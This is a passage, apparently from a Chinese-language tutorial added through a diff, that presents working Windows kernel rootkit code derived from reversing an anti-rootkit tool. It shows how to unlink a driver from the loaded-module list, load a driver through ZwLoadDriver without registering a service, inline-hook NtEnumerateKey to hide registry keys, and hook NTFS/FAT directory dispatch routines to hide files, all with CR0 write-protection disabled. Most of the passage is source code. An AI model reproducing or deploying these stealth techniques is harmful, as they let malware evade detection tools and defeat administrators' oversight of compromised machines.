+    DWORD  driver_start;
+    DWORD  unk1;
+    UNICODE_STRING driver_Path;
+    UNICODE_STRING driver_Name;
+} MODULE_ENTRY, *PMODULE_ENTRY;
+
+进一步分析后发现上述结构中的unk1成员的值其实就是该模块文件的大小.从新对该结构定义如下:
+
+typedef struct _MODULE_ENTRY {
+    LIST_ENTRY le_mod;
+    DWORD  unknown[4];
+    DWORD  base;
+    DWORD  driver_start;
+    DWORD  Size;
+    UNICODE_STRING driver_Path;
+    UNICODE_STRING driver_Name;
+} MODULE_ENTRY, *PMODULE_ENTRY;
+
+    PsLoadedModuleList指向的是一个带表头的双向链表，该链表的表头所指向的第一个MODULE_ENTRY的就是ntoskrnl.exe，此时它的base成员的值就是ntoskrnl.exe在内存中的起始地址.这是就可以顺手取一下NtoskrnlBase的值。
+    有一点要注意的是，如果DriverEntry()例程未返回STATUS_SUCCESS之前。系统不会把你加入到PsLoadedModuleList链表中，此时你在PsLoadedModuleList中是找不到自己的。当然为了这个而写一个分发例程也行。我是在自己hook的那些系统函数中设了一个阀值，阀值初始值为“开”，这样系统调用这个函数时都会先检测阀值是否是“开”，是的话跑到PsLoadedModuleList找一下我们的模块是否存在，存在的话说明DriverEntry()已经返回成功，马上把自己从PsLoadedModuleList链表中删除，然后把阀值设成“关”，这样系统下次调用这个函数时发现阀值是“关”的就不会傻乎乎的又跑到PsLoadedModuleList中去搂一遍了。
+
+DWORD NtoskrnlBase=0;
+DWORD PsLoadedModuleListPtr=0;
+
+typedef struct _MODULE_ENTRY {
+
+    LIST_ENTRY le_mod;
+    DWORD  unknown[4];
+    DWORD  base;
+    DWORD  driver_start;
+    DWORD  Size;
+    UNICODE_STRING driver_Path;
+    UNICODE_STRING driver_Name;
+} MODULE_ENTRY, *PMODULE_ENTRY;
+
+NTSTATUS GetPsLoadedModuleListPtr()
+{
+    UNICODE_STRING  UStrName;
+    DWORD KdEnableDebuggerAddr;
+    DWORD InitSystem=0;
+    DWORD KdDebuggerDataBlock=0;
+    PMODULE_ENTRY NtosModPtr;
+    unsigned char * DebuggerDataBlockPtr;
+    unsigned char * Sysinit;
+    int i,j;
+        
+        RtlInitUnicodeString (
+                    &UStrName, 
+                    L"KdEnableDebugger" );
+
+        KdEnableDebuggerAddr=(DWORD)MmGetSystemRoutineAddress( &UStrName );                                                
+        
+        if ( !KdEnableDebuggerAddr )
+        {
+            return STATUS_DEVICE_CONFIGURATION_ERROR;
+        }
+        
+        for (i=0, Sysinit = (unsigned char * )KdEnableDebuggerAddr; i<0x50; i++, Sysinit++)
+        {
+            if ( (*Sysinit) == 0xc6 && (*(Sysinit+0x1)) == 0x05 && (*(Sysinit+0x6)) == 0x01 && (*(Sysinit+0x7)) == 0xE8 )
+            {
+                _asm
+                {
+                    pushad
+                    mov edi, Sysinit
+                    mov eax, [edi+0x8]
+                    add edi, 0xC
+                    add edi, eax
+                    mov InitSystem, edi
+                    popad
+                }
+            }
+            if ( InitSystem != 0) break;
+
+        }
+
+        if ( InitSystem == 0 )
+        {
+            return STATUS_DEVICE_CONFIGURATION_ERROR;
+        } 
+        
+        for ( i=0, DebuggerDataBlockPtr = (unsigned char * )InitSystem; i<0x70; i++,DebuggerDataBlockPtr++)
+        {
+
+            if ( *((DWORD*)DebuggerDataBlockPtr) == 0x4742444b )
+            {
+                DebuggerDataBlockPtr--;
+                DebuggerDataBlockPtr--;
+
+                for (j=0; j<0x10; j++, DebuggerDataBlockPtr--)
+                {
+                    if ( *DebuggerDataBlockPtr == 0x68 )
+                    {
+                        _asm 
+                        {
+                            pushad
+                            mov edi, DebuggerDataBlockPtr
+                            inc edi
+                            mov eax, [edi]
+                            mov KdDebuggerDataBlock, eax
+                            popad
+                        }
+                        break;
+                    }
+                }
+                
+            }
+
+            if ( KdDebuggerDataBlock != 0 )
+            {
+                break;
+            }
+        }
+
+        if ( KdDebuggerDataBlock == 0 )
+        {
+            return STATUS_DEVICE_CONFIGURATION_ERROR;
+        }
+
+        _asm
+        {
+            pushad
+            mov edi, KdDebuggerDataBlock
+            mov eax, [edi+0x48]
+            mov PsLoadedModuleListPtr, eax
+            popad
+        }
+
+        if ( PsLoadedModuleListPtr == 0 )
+        {
+            return STATUS_DEVICE_CONFIGURATION_ERROR;
+        }
+        
+        //获取 Ntoskrnl 的起始地址
+        NtosModPtr = ( PMODULE_ENTRY ) PsLoadedModuleListPtr;
+        NtosModPtr = ( PMODULE_ENTRY ) (NtosModPtr->le_mod.Flink );   
+        NtoskrnlBase = (DWORD) ( NtosModPtr->base );
+
+        return STATUS_SUCCESS;
+
+}
+
+NTSTATUS RemoveModule ( )
+{
+    DWORD RemoveModleAddr;
+    PMODULE_ENTRY PModPtr_Current;
+    PMODULE_ENTRY PModPtr_Flink;
+    PMODULE_ENTRY PModPtr_Blink;
+
+            PModPtr_Current=(PMODULE_ENTRY)PsLoadedModuleListPtr;
+            
+
+
+            PModPtr_Flink = (PMODULE_ENTRY)(PModPtr_Current->le_mod.Flink);
+
+            //Get RemoveModle Addr
+
+            RemoveModleAddr= DriverAddr;
+
+            for ( ; PModPtr_Flink->le_mod.Flink != (PLIST_ENTRY) PModPtr_Current ; PModPtr_Flink = (PMODULE_ENTRY)(PModPtr_Flink->le_mod.Flink) )
+            {
+                if ( RemoveModleAddr > ((DWORD)PModPtr_Flink->base) && RemoveModleAddr < ((DWORD)(PModPtr_Flink->Size) + ((DWORD)PModPtr_Flink->base)) )
+                {
+                    PModPtr_Blink = (PMODULE_ENTRY)(PModPtr_Flink->le_mod.Blink);
+                    PModPtr_Flink = (PMODULE_ENTRY)(PModPtr_Flink->le_mod.Flink);
+                    PModPtr_Blink->le_mod.Flink= (PLIST_ENTRY)PModPtr_Flink;
+                    PModPtr_Flink->le_mod.Blink= (PLIST_ENTRY)PModPtr_Blink;
+                    IsDelModule=TRUE;
+                    break;
+                }
+            }
+            if ( IsDelModule != TRUE )
+            {
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+            return STATUS_SUCCESS;
+
+}
+
+    上面这两个函数中，GetPsLoadedModuleListPtr()是通过特征码搜索获取KdDebuggerDataBlock的位置，使用特征码搜索办法虽然不是很好，但是通用性强。然后再以此获取PsLoadedModuleList地址，RemoveModule()用来实现在PsLoadedModuleList链表中删除自己。在PsLoadedModuleList中定位的方法也是使用上面利用DriverAddr定位。
+
+
+五、隐藏服务：
+
+    普通情况下加载驱动需要 OpenSCManager->CreateService->StartService，这样驱动就会跑到服务管理器中去注册一下自己，并且要隐藏这样加载驱动的服务，不是不行，只是太麻烦而且没效率了。要hook一大堆的服务函数。不过在逆向IS的时候发现了一个不需要去服务管理器注册而直接加载驱动的方法。就是使用ZwLoadDriver（这个函数通常是ring0中加载驱动时用，由于被Ntdll.dll导出，ring3就也能用了）进行直接加载。这样就不用去服务管理器中注册自己，并且这样加载的驱动windows系统工具中的“系统信息”查看器也查不到你，更不用说那些什么服务管理器之类的东东了。屡用不爽。下面介绍一下用法：
+
+    1、首先自己在注册表的服务项中添加一个自己的服务名字项。
+    2、在自己添加的服务名字项中添加一些驱动信息（其实就是手工实现CreateService()函数对注册表的那些操作），这些信息包括“ErrorControl”，“ImagePath”，“Start”，“Type”等等。你要手工设置这些键以及键值。
+
+按上面设置完后，来看看ZwLoadDriver的原形：
+
+NTSTATUS
+    ZwLoadDriver(
+    IN PUNICODE_STRING DriverServiceName );
+
+下面的代码给出了ZwLoadDriver的使用例子：
+
+AnotherWayStartService( TCHAR *szDir )
+{
+    HKEY RegKey;
+    HKEY hLicenses;
+    DWORD disp;
+    DWORD ErrorControl=NULL;
+    DWORD ProcessID;
+    DWORD Start=3;
+    DWORD Type=1;
+    LONG Regrt;
+
+    DWORD ZwLoadDriver;
+    DWORD RtlInitUnicodeString;
+    
+    UNICODE_STRING RegService;
+
+    PCWSTR    RegServicePath= L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\neverdeath";
+
+    TCHAR    DriverFilePath[MAX_PATH] = "\\??\\";
+
+
+        Regrt = RegOpenKeyEx (
+                    HKEY_LOCAL_MACHINE,
+                    "SYSTEM\\CurrentControlSet\\Services",
+                    0,
+                    KEY_CREATE_SUB_KEY + KEY_SET_VALUE,
+                    &hLicenses );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+
+        Regrt=RegCreateKeyEx (
+                    hLicenses,
+                    "neverdeath",
+                    0,
+                    "",
+                    REG_OPTION_NON_VOLATILE,
+                    KEY_ALL_ACCESS,
+                    NULL,
+                    &RegKey,
+                    &disp );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+
+            Regrt = RegOpenKeyEx (
+                        HKEY_LOCAL_MACHINE,
+                        "SYSTEM\\CurrentControlSet\\Services\\neverdeath",
+                        0,
+                        KEY_CREATE_SUB_KEY + KEY_SET_VALUE,
+                        &RegKey );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+
+        Regrt = RegSetValueEx (
+                    RegKey,
+                    "ErrorControl",
+                    NULL,
+                    REG_DWORD,
+                    (const unsigned char *)(&ErrorControl),
+                    4 );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+        
+        strcat(DriverFilePath, szDir);
+
+        Regrt = RegSetValueEx (
+                    RegKey,
+                    "ImagePath",
+                    NULL,
+                    REG_EXPAND_SZ,
+                    (const unsigned char *)(&DriverFilePath),
+                    strlen( DriverFilePath ) );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+
+
+        Regrt = RegSetValueEx (
+                    RegKey,
+                    "Start",
+                    NULL,
+                    REG_DWORD,
+                    (const unsigned char *)(&Start),
+                    4 );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+        
+        Regrt = RegSetValueEx (        
+                    RegKey,
+                    "Type",
+                    NULL,
+                    REG_DWORD,
+                    (const unsigned char *)(&Type),
+                    4 );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }
+
+        //还记得前面隐藏进程时，我们进程ID是从注册表中取的
+        //下面就是把进程ID写入注册表，不会影响驱动的加载
+
+        ProcessID=GetCurrentProcessId();    
+
+        Regrt = RegSetValueEx (
+                    RegKey,
+                    "ProcessID",
+                    NULL,
+                    REG_DWORD,
+                    (const unsigned char *)(&ProcessID),
+                    4 );
+
+        if ( Regrt != ERROR_SUCCESS ) 
+        {
+            return false;
+        }        
+        
+        CloseHandle( RegKey );
+
+
+        ZwLoadDriver = (DWORD) GetProcAddress ( 
+                            GetModuleHandle( "ntdll.dll" ), 
+                            "ZwLoadDriver" );
+
+        RtlInitUnicodeString = (DWORD) GetProcAddress( 
+                                GetModuleHandle( "ntdll.dll" ), 
+                                "RtlInitUnicodeString" );
+        
+        _asm
+        {
+            pushad
+            push RegServicePath
+            lea edi, RegService 
+            push edi
+            call RtlInitUnicodeString    //装载UNICODE字符
+
+            lea edi, RegService
+            push edi
+            call ZwLoadDriver    
+            popad
+        }
+
+        return true;
+
+}
+
+请注意上面这段代码中加载驱动时所使用的注册表路径格式是：
+“\\Registry\\Machine\\System\\CurrentControlSet\\Services\\neverdeath”
+而不是：
+“HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\neverdeath”
+也许你已经想到了那么卸载驱动会不会就是函数“ZwUnloadDriver”？自己试一下不就知道了：）
+
+
+六、隐藏注册表：
+
+    IS处理注册表并没有什么新意，就是调用那些ZwCreateKey、ZwOpenKey、ZwQueryKey、ZwSetValueKey一类的注册表操作函数，通过伪造内核文件，所以这部分可以很轻松hook并实现隐藏。IS在这里玩了一个小花样，在XP下，IS会在把从ntoskrnl.exe读到的NtEnumerateKey起始地址的第三个字（注意是字，不是字节！）先加上0xD50后，再进行还原，因此你在伪造内核文件时必须先把自己构造的代码的第三个字减去0xD50后再写入到otoskrnl.exe中，否则就等着BSOD吧。而在2K中就不需要这些操作。这里主要是通过hook注册表函数NtEnumerateKey来隐藏我们注册中的“CurrentControlSet\Services”下的 “neverdeath”项以及“CurrentControlSet\Enum\Root”下的“LEGACY_NEVERDEATH”项。至于隐藏键与键值在这里就不说了，自己随手写一个就是了。顺便提一下，由于windows的regedit也是调用这些函数访问注册表，所以如果你在IS中隐藏了注册表也就等于在windows的regedit中隐藏了。以下代码在XP下测试通过，如要在2K或2K3中运行，请根据需要自己进行取舍。
+由于NtEnumerateKey没有被ntoskrnl.exe导出，这里利用
+NtEnumerateKey在服务表 偏移 ＝ “NtDuplicateToken”在服务表中的偏移＋2 
+来获取NtEnumerateKey地址。
+
+PCWSTR HideKey = L"neverdeath";
+PCWSTR HideKeyLEG = L"LEGACY_NEVERDEATH";
+
+unsigned char ResumCodeNtEnumerateKey[6];
+unsigned char CrackCodeNtEnumerateKey[6];
+unsigned char CrackCodeNtEnumerateKeyWriteFile[6];
+
+typedef NTSTATUS ( *NTENUMERATEKEY ) (
+  IN HANDLE            KeyHandle,
+  IN ULONG            Index,
+  IN KEY_INFORMATION_CLASS  KeyInformationClass,
+  OUT PVOID            KeyInformation,
+  IN ULONG            Length,
+  OUT PULONG        ResultLength );
+
+NTENUMERATEKEY OldNtEnumerateKey;
+
+typedef struct ServiceDescriptorEntry {
+    unsigned int *ServiceTableBase;
+    unsigned int *ServiceCounterTableBase; //Used only in checked build
+    unsigned int NumberOfServices;
+    unsigned char *ParamTableBase;
+} ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;
+
+extern PServiceDescriptorTableEntry KeServiceDescriptorTable;
+
+NTSTATUS NewNtEnumerateKey(
+
+  IN HANDLE            KeyHandle,
+  IN ULONG            Index,
+  IN KEY_INFORMATION_CLASS  KeyInformationClass,
+  OUT PVOID            KeyInformation,
+  IN ULONG            Length,
+  OUT PULONG        ResultLength )
+{
+    NTSTATUS Status;
+    PCWSTR KeyNamePtr;
+
+
+            _asm  //还原
+            {
+                pushad
+                mov edi, OldNtEnumerateKey
+                mov eax, dword ptr ResumCodeNtEnumerateKey[0]
+                mov [edi], eax
+                mov ax, word ptr ResumCodeNtEnumerateKey[4]
+                mov [edi+4], ax
+                popad
+            }
+
+            Status = ZwEnumerateKey ( 
+                            KeyHandle,
+                            Index,
+                            KeyInformationClass,
+                            KeyInformation,
+                            Length,
+                            ResultLength );
+        
+            
+            if ( Status == STATUS_SUCCESS )
+            {
+                 _asm
+                 {
+                    push edi
+                    mov edi, KeyInformation
+                    add edi, 0x10
+                    mov KeyNamePtr, edi
+                    pop edi
+                 }
+                 if ( wcsstr(KeyNamePtr, HideKey)!=NULL || wcsstr(KeyNamePtr, HideKeyLEG) != NULL )
+                 {
+                     Index=Index+1;
+                     Status = OldNtEnumerateKey ( 
+                                    KeyHandle,
+                                    Index,
+                                    KeyInformationClass,
+                                    KeyInformation,
+                                    Length,
+                                    ResultLength );
+                 }
+            }
+            
+            _asm //替换
+            {
+                pushad
+                mov edi, OldNtEnumerateKey
+                mov eax, dword ptr CrackCodeNtEnumerateKey[0]
+                mov [edi], eax
+                mov ax, word ptr CrackCodeNtEnumerateKey[4]
+                mov [edi+4], ax
+                popad
+            }
+            return Status; 
+
+}
+NTSTATUS GetOldNtEnumerateKey()
+{
+    DWORD NtDuplicateTokenAddr;
+    int i=0;
+
+            NtDuplicateTokenAddr = GetFunctionAddr( L"NtDuplicateToken" );
+
+            if ( NtDuplicateTokenAddr == NULL )
+            {
+                DbgPrint("Get NtQuerySystemInformation Addr Error!!");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            for (;;i++)
+            {
+                if ( NtDuplicateTokenAddr == (DWORD)(*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + i)) )
+                {
+                    OldNtEnumerateKey = (NTENUMERATEKEY)(*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + (i+2)));
+                    break;
+                }
+            }
+            return STATUS_SUCCESS;
+
+}
+
+NTSTATUS PatchNtEnumerateKey()
+{
+    NTSTATUS Status;
+                                                                   
+
+            Status = GetOldNtEnumerateKey();
+
+            if ( Status != STATUS_SUCCESS )
+            {
+                DbgPrint("Get NtQuerySystemInformation Addr Error!!");
+                return STATUS_DEVICE_CONFIGURATION_ERROR;
+            }
+
+            _asm    //关中断
+            {
+                CLI            
+                MOV    EAX, CR0     
+                AND EAX, NOT 10000H  
+                MOV    CR0, EAX        
+            }
+
+            _asm
+            {
+                pushad
+                //获取 NtEnumerateKey 函数的地址并保留该函数的起始六个字节
+                mov edi, OldNtEnumerateKey
+                mov eax, [edi]
+                mov dword ptr ResumCodeNtEnumerateKey[0], eax
+                mov ax, [edi+4]
+                mov word  ptr ResumCodeNtEnumerateKey[4], ax
+                
+                //构造要替换的代码，使得系统调用该函数时跳到我们构造的NewNtEnumerateKey去执行
+
+                mov byte ptr CrackCodeNtEnumerateKey[0], 0x68
+                mov byte ptr CrackCodeNtEnumerateKeyWriteFile[0],0x68
+                lea edi, NewNtEnumerateKey
+                mov dword ptr CrackCodeNtEnumerateKey[1], edi
+                mov dword ptr CrackCodeNtEnumerateKeyWriteFile[1], edi
+                mov byte ptr CrackCodeNtEnumerateKey[5], 0xc3
+                mov byte ptr CrackCodeNtEnumerateKeyWriteFile[5], 0xc3
+    
+                //把第NtEnumerateKey的第三个字减去D50在送回
+                mov ax, word ptr CrackCodeNtEnumerateKeyWriteFile[4]
+                sub ax, 0xD50
+                mov word ptr CrackCodeNtEnumerateKeyWriteFile[4], ax
+
+
+                //把构造好的代码进行替换
+                mov edi, OldNtEnumerateKey
+                mov eax, dword ptr CrackCodeNtEnumerateKey[0]
+                mov dword ptr[edi], eax
+                mov ax, word ptr CrackCodeNtEnumerateKey[4]
+                mov word ptr[edi+4], ax
+                popad
+            }
+
+            _asm    //开中断 
+            {
+                MOV    EAX, CR0       
+                OR    EAX, 10000H            
+                MOV    CR0, EAX            
+                STI                    
+            }
+
+            Status = RepairNtosFile(
+                            (DWORD)OldNtEnumerateKey,
+                            //(DWORD)(&CrackCodeNtEnumerateKey) 2k
+                            (DWORD)(&CrackCodeNtEnumerateKeyWriteFile) ); //XP
+            return Status;
+
+}
+
+
+7、隐藏文件：
+
+    终于写到隐藏文件，在实现隐藏文件的过程中，越来越欣赏PJF。IS在获取文件列表的过程时，迂回战术简直玩到了另人匪夷所思的地步！我花了很多时间（好几次坐在机子面前十几个小时想的脑袋都绿了却一点收获都没有）才实现了不用IFS，不用attach文件设备直接而进行隐藏，当时我甚至去hook函数IoCallDriver函数（经常看到有些人hook这个函数失败，便造谣此函数不能hook，其实是可以的，但是确实很麻烦，如果你也想试试，为了让你少走弯路，好意提醒一下，请尽最大努力保护好寄存器！）来截获系统所有的IRP包，然后分析，真是差点没把我搞死！
+    普通情况下，我们是通过发送IRP_MJ_DIRECTORY_CONTROL（0xC）请求给FSD来获取文件列表的。获取后的信息存在IRP->UserBuffer(0x3c)中。但是你会发现IS在获取文件列表时并不发送IRP_MJ_DIRECTORY_CONTROL给FSD，而是发送IRP_MJ_DEVICE_CONTROL（0xE）请求给另外一个不知名设备。并且在该被请求完成后，你在完成的IRP数据中找不到任何有关文件名字的影子。或许你便开始点一只烟，盯着屏幕直发楞，直想：“这怎么可能呢？”（呵呵，也许pjf要的就是这种效果）。
+
+    邪恶的微软总是想方设法的企图蒙蔽我们，让我们忽略本质！内核里面的那些什么对象啊、设备啊、这个啊、那个啊、所有乱七八糟的东东，从本质上来讲还不都是一堆代码与数据。IS不发送IRP_MJ_DIRECTORY_CONTROL请求不代表它不会调用这个例程。
+
+    我对IS获取文件列表的猜想（IS的anti Debug太强， 为了今年之内把这个搞定，因此没时间再陪它耗下去了）：
+
+    单独创造一个Device，这个Device的IRP_MJ_DEVICE_CONTROL例程中构造IRP与DEVICE_OBJECT后，直接调用IRP_MJ_DIRECTORY_CONTROL例程，这样就避免了向文件设备发送请求但是还能获取文件列表的目的了。关于在完成后的IRP包中无法获取文件名的功能，其实只要在直接调用IRP_MJ_DIRECTORY_CONTROL例程之后，把IRP->UserBuffer中的内容转移或加个密就轻易实现了。
+
+    虽然这只是猜想，但是为了验证我的想法。我单独写了个test证明我的想法是可行的。我不能确定IS就是这样做，但我能确定如果你这样做的话就能达到类似的效果。
+
+    IS就是通过设置IO_COMPLETION_ROUTINE函数来第一时间处理完成后的结果，我们下面用的方法就是通过替换这个IO_COMPLETION_ROUTINE来抢先处理结果。我们处理完了再调用IS的IO_COMPLETION_ROUTINE函数。另外要说的是，由于IS用的MinorFunction是IRP_MN_QUERY_DIRECTORY，每次都肯定能返回一个文件名（哪怕已重复出现）。而你在自己的IO_COMPLETION_ROUTINE中如果检测到是自己要隐藏的文件名的话，不能不调用原先IS的IO_COMPLETION_ROUTINE，否则BSOD。因此你只能更改文件属性了，更改文件属性也能达到隐藏的目的。还记不记的以前DOS时代的[.]与[..]文件夹吗（那片笑声让我想起我的那些文件夹）。当返回你要隐藏的文件时信息，把这些信息全都替换成[.]或[..]文件夹属性（当然包括文件名信息了）就行了。
+
+    下面的代码先获取FSD设备的IRP_MJ_DIRECTORY_CONTROL分派函数的地址，然后对该函数进行hook。在我们构造的新的IRP_MJ_DIRECTORY_CONTROL分派函数中通过IO_STACK_LOCATION中的Length（+0x4）数值来判断是否时IS（IS的Length很特殊，是0xfe8。平常的都是0x1000），是的话就进行替换IO_COMPLETION_ROUTINE。
+
+    下的代码在FAT32、NTFS、NTFS&FAT32中测试通过，在纯Fat中也测试通过。
+
+PCWSTR    HideDirectory =L"neverdeath";
+PCWSTR    HideFile = L"otoskrnl.exe";
+
+DWORD NtfsUserbuf;
+DWORD NtfsFileName;
+DWORD NtfsLocaIrp;
+
+DWORD FatUserbuf;
+DWORD FatFileName;
+DWORD FatLocaIrp;
+
+typedef NTSTATUS  (*_DISPATCH) 
+(
+  IN PDEVICE_OBJECT  DeviceObject,
+  IN OUT PIRP        Irp 
+);
+
+_DISPATCH OldNtfsQueryDirectoryDispatch;
+_DISPATCH OldFatQueryDirectoryDispatch;
+
+PIO_COMPLETION_ROUTINE    OldNtfsCompletionRuntine;
+PIO_COMPLETION_ROUTINE  OldFatCompletionRuntine;
+
+NTSTATUS NewNtfsCompletionRuntine(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PIRP Irp,
+    IN PVOID Context )
+{
+    NTSTATUS Status;
+
+                _asm
+                {
+                    pushad
+                    mov edi, NtfsUserbuf
+                    add edi, 0x5e
+                    mov NtfsFileName, edi
+                    popad
+                }
+                if ( wcsstr( NtfsFileName, HideDirectory ) ||  wcsstr( NtfsFileName, HideFile ) )
+                {
+                    _asm
+                    {
+                        pushad
+                        mov edi,NtfsUserbuf
+                        mov eax, 0x16
+                        mov dword ptr [edi+0x38], eax
+                        mov eax, 0x04
+                        mov dword ptr [edi+0x3c], eax
+                        mov eax, 0x002e002e
+                        mov dword ptr [edi+0x5e], eax
+                        popad
+                    }
+                }
+                Status = OldNtfsCompletionRuntine (
+                                    DeviceObject,
+                                    Irp,
+                                    Context );                
+                return Status;
+                
+}
+
+NTSTATUS NewFatCompletionRuntine(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PIRP Irp,
+    IN PVOID Context )
+{
+    NTSTATUS Status;
+
+                _asm
+                {
+                    pushad
+                    mov edi, FatUserbuf
+                    add edi, 0x5e
+                    mov FatFileName, edi
+                    popad
+                }
+                if ( wcsstr( FatFileName, HideDirectory ) ||  wcsstr( FatFileName, HideFile ) )
+                {
+                    _asm
+                    {
+                        pushad
+                        mov edi,FatUserbuf
+                        mov eax, 0x16
+                        mov dword ptr [edi+0x38], eax
+                        mov eax, 0x04
+                        mov dword ptr [edi+0x3c], eax
+                        mov eax, 0x002e002e
+                        mov dword ptr [edi+0x5e], eax
+                        popad
+                    }
+                }
+                Status = OldFatCompletionRuntine (
+                                    DeviceObject,
+                                    Irp,
+                                    Context );                
+                return Status;
+                
+}
+
+NTSTATUS NewNtfsQueryDirectoryDispatch ( 
+  IN PDEVICE_OBJECT  DeviceObject,
+  IN OUT PIRP        Irp )
+{
+    NTSTATUS    Status;
+    DWORD        QueryFile; 
+
+
+                _asm
+                {
+                    pushad
+                    mov edi, OldNtfsQueryDirectoryDispatch
+                    mov eax, dword ptr ResumCodeNtfsQueryDirectoryDispatch[0]
+                    mov [edi], eax
+                    mov ax, word ptr ResumCodeNtfsQueryDirectoryDispatch[4]
+                    mov [edi+4], ax
+                    popad
+                }
+
+                _asm
+                {
+                    pushad
+                    mov edi, Irp
+                    mov eax, [edi+0x60]
+                    mov ecx, [edi+0x3c]
+                    mov edi, [eax+4]
+                    mov QueryFile, edi
+                    mov NtfsUserbuf, ecx
+                    mov NtfsLocaIrp, eax
+                    popad
+                }
+
+                if ( QueryFile == 0xfe8 )
+                {
+                    _asm
+                    {
+                        pushad
+                        mov edi, NtfsLocaIrp
+                        mov eax, [edi+0x1c]
+                        mov OldNtfsCompletionRuntine, eax
+                        lea eax, NewNtfsCompletionRuntine
+                        mov [edi+0x1c], eax
+                        popad
+                    }                
+                }
+
+
+                Status = OldNtfsQueryDirectoryDispatch (
+                                        DeviceObject,
+                                        Irp );
+
+                _asm 
+                {
+                    pushad
+                    mov edi, OldNtfsQueryDirectoryDispatch
+                    mov eax, dword ptr CrackCodeNtfsQueryDirectoryDispatch[0]
+                    mov [edi], eax
+                    mov ax, word ptr CrackCodeNtfsQueryDirectoryDispatch[4]
+                    mov [edi+4], ax
+                    popad
+                }
+                return Status;
+}
+
+
+NTSTATUS NewFatQueryDirectoryDispatch ( 
+  IN PDEVICE_OBJECT  DeviceObject,
+  IN OUT PIRP        Irp )
+{
+    NTSTATUS    Status;
+    DWORD        QueryFile; 
+
+
+                _asm
+                {
+                    pushad
+                    mov edi, OldFatQueryDirectoryDispatch
+                    mov eax, dword ptr ResumCodeFatQueryDirectoryDispatch[0]
+                    mov [edi], eax
+                    mov ax, word ptr ResumCodeFatQueryDirectoryDispatch[4]
+                    mov [edi+4], ax
+                    popad
+                }
+
+                _asm
+                {
+                    pushad
+                    mov edi, Irp
+                    mov eax, [edi+0x60]
+                    mov ecx, [edi+0x3c]
+                    mov edi, [eax+4]
+                    mov QueryFile, edi
+                    mov FatUserbuf, ecx
+                    mov FatLocaIrp, eax
+                    popad
+                }
+
+                if ( QueryFile == 0xfe8 )
+                {
+                    _asm
+                    {
+                        pushad
+                        mov edi, FatLocaIrp
+                        mov eax, [edi+0x1c]
+                        mov OldFatCompletionRuntine, eax
+                        lea eax, NewFatCompletionRuntine
+                        mov [edi+0x1c], eax
+                        popad
+                    }                
+                }
+
+
+                Status = OldFatQueryDirectoryDispatch  (
+                                        DeviceObject,
+                                        Irp );
+
+                _asm 
+                {
+                    pushad
+                    mov edi, OldFatQueryDirectoryDispatch
+                    mov eax, dword ptr CrackCodeFatQueryDirectoryDispatch[0]
+                    mov [edi], eax
+                    mov ax, word ptr CrackCodeFatQueryDirectoryDispatch[4]
+                    mov [edi+4], ax
+                    popad
+                }
+                return Status;
+}
+
+NTSTATUS PatchFileSystemDevicePatDispatch()
+{
+    NTSTATUS NtfsStatus;
+    NTSTATUS FastFatStatus;
+    UNICODE_STRING FileSystemName;
+    PVOID FileDeviceObject;
+    POBJECT_TYPE ObjectType;
+    
+        DbgPrint("My Driver Loaded!");
+
+        RtlInitUnicodeString( &FileSystemName, L"\\FileSystem\\Ntfs" );
+
+        NtfsStatus = ObReferenceObjectByName  (  
+                                &FileSystemName,  
+                                0x40,  
+                                NULL,  
+                                NULL,  
+                                &ObjectType,  
+                                NULL,  
+                                NULL,  
+                                &FileDeviceObject ); 
+        if  ( NtfsStatus == STATUS_SUCCESS )
+        {
+
+            _asm
+        {
+            pushad
+            mov edi, FileDeviceObject
+            mov eax, [edi+0x68]
+            mov OldNtfsQueryDirectoryDispatch, eax
+            popad
+        }
+
+    
+            _asm
+        {
+            CLI                  
+            MOV    EAX, CR0       
+            AND EAX, NOT 10000H 
+            MOV    CR0, EAX      
+        }
+
+              _asm
+        {
+            pushad
+            mov edi, OldNtfsQueryDirectoryDispatch
+            mov eax, [edi]
+            mov dword ptr ResumCodeNtfsQueryDirectoryDispatch[0], eax
+            mov ax, [edi+4]
+            mov word  ptr ResumCodeNtfsQueryDirectoryDispatch[4], ax
+            
+            mov byte ptr CrackCodeNtfsQueryDirectoryDispatch[0], 0x68
+            lea edi, NewNtfsQueryDirectoryDispatch
+            mov dword ptr CrackCodeNtfsQueryDirectoryDispatch[1], edi
+            mov byte ptr CrackCodeNtfsQueryDirectoryDispatch[5], 0xC3
+
+            mov edi, OldNtfsQueryDirectoryDispatch
+            mov eax, dword ptr CrackCodeNtfsQueryDirectoryDispatch[0]
+            mov dword ptr[edi], eax
+            mov ax, word ptr CrackCodeNtfsQueryDirectoryDispatch[4]
+            mov word ptr[edi+4], ax
+            popad
+        }
+
+
+            _asm 
+        {
+            MOV    EAX, CR0       
+            OR    EAX, 10000H          
+            MOV    CR0, EAX               
+            STI                   
+        }
+        }
+
+
+        RtlInitUnicodeString( &FileSystemName, L"\\FileSystem\\Fastfat" );
+
+        FastFatStatus = ObReferenceObjectByName (  
+                                &FileSystemName,  
+                                0x40,  
+                                NULL,  
+                                NULL,  
+                                &ObjectType,  
+                                NULL,  
+                                NULL,  
+                                &FileDeviceObject ); 
+        if ( FastFatStatus == STATUS_SUCCESS )
+        {
+            _asm
+        {
+            pushad
+            mov edi, FileDeviceObject
+            mov eax, [edi+0x68]
+            mov OldFatQueryDirectoryDispatch, eax
+            popad
+        }
+
+    
+            _asm
+        {
+            CLI                   
+            MOV    EAX, CR0       
+            AND EAX, NOT 10000H 
+            MOV    CR0, EAX      
+        }
+
+              _asm
+        {
+            pushad
+            mov edi, OldFatQueryDirectoryDispatch
